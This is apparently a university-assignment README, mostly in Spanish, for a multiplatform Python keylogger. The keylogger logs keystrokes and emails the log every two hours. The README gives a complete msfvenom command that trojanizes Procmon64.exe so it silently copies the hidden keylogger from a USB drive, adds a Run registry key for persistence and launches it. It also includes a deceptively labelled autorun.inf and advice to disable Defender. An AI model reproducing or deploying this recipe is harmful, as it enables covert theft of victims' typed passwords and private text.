# Keylogger

Multiplatform keylogger for a uni assignment from 2021 (Spanish)

## Descripción

Los módulos de python de los que depende, principalmente, son el módulo `keyboard` para capturar las pulsaciones, y el módulo `smtplib` para enviar el log por correo electrónico.

El resultado es un programa multiplataforma (Windows/Linux) que crea el archivo local `pulsaciones_grabadas.txt`, añadiendo cada minuto las pulsaciones capturadas y, cada 2 horas, lo envia por mail a nuestro correo electrónico. A partir del parámetro opcional de la función `keyboard.wait()`, se define el atajo `CTRL+SHIFT+ESPACIO` para terminar la ejecución del keylogger, momento en que enviará por correo el contenido de `pulsaciones_grabadas.txt` y eliminará el archivo.

Pensando en la persistencia, se ha añadido también la posibilidad de detectar si ya existe un archivo `pulsaciones_grabadas.txt` al empezar la ejecución, lo que significaría que ha habido un reinicio desde el último mail enviado y el momento actual. De ser el caso, envía el archivo inmediatamente y continúna con la ejecución.

En tanto que el soporte del módulo `keyboard` para unicode es limitado, se ha solucionado la detección de caracteres acentuados a partir de un diccionario de substitución, para poder dar soporte a cadenas de texto tanto en catalán como en castellano. Asimismo, se ha usado el mismo método para mayor legibilidad de los caracteres especiales.

## Creación de ejecutable

El código del keylogger ha sido compilado con `pyinstaller`, con las opciones `--onefile` y `--noconsole` para convertirlo en un ejecutable portable y que se ejecute en segundo plano, respectivamente.

A continuación inyectamos los comandos de instalación en otro archivo con `msfvenom` (incluido en *Metasploit Framework*):

```shell
msfvenom -p windows/x64/exec cmd="cmd /c xcopy /h /y /q E:\keylogger.exe C:\Temp\ | findstr /v . & reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Keylogger /t REG_SZ /d C:\Temp\keylogger.exe /f | findstr /v . & C:\Temp\keylogger.exe" exitfunc=thread -x Procmon64.exe -k -f exe -o SysInternals.exe
```

Se ha escogido arbitrariamente el programa Procmon64.exe de la suite de Sysinternals de Windows. Los comandos que se ejecutarán al abrirlo serán, en este orden: la copia del
keylogger.exe de la unidad USB al directorio `C:\Temp\`; la adición del keylogger en la clave `CurrentVersion\Run` del registro (lo que hará que se ejecute en cada reinicio); y, por último, la ejecución del keylogger desde su nueva ubicación.

En tanto que las signaturas de `msfvenom` son conocidas para Microsoft Defender, deshabilitaremos temporalmente la protección en tiempo real para la demostración.

## Ejecución en USB

Añadimos keylogger.exe (oculto), SysInternals.exe y creamos el archivo autorun.inf en la carpeta raíz del USB con los siguientes contenidos:

```
[Autorun]
Open=SysInternals.exe
Action=Instalar System Internals
Label=Drivers
```

Aún así, cabe destacar que la funcionalidad autorun vía USB ha sido deshabilitada para las versiones de Windows posteriores a Vista, por lo que este último paso no tendrá efecto en estas.
